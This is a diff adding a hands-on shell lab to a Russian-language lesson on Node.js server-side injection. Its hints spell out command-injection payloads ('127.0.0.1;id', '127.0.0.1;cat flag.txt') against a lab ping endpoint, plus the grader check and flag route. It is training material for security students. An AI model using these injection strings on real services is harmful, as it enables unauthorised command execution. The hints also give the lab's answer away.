@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 40
 summary: "Node.js-специфичные sinks: eval, Function, vm/vm2 sandbox escape, child_process, template literals, prototype pollution → RCE."
+lab:
+  kind: shell
+  title: "Практика: серверные инъекции в Node.js"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - У сервиса три эндпоинта: `/calc?expr=`, `/run?code=`, `/ping?host=`.
+    - `/ping` собирает shell-команду — попробуй разделитель: `curl -s 'https://tools.example/ping?host=127.0.0.1;id'`.
+    - `;` запускает вторую команду от имени процесса Node (www-data).
+    - Прочитай флаг: `curl -s 'https://tools.example/ping?host=127.0.0.1;cat flag.txt' | grep 'nto{' > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
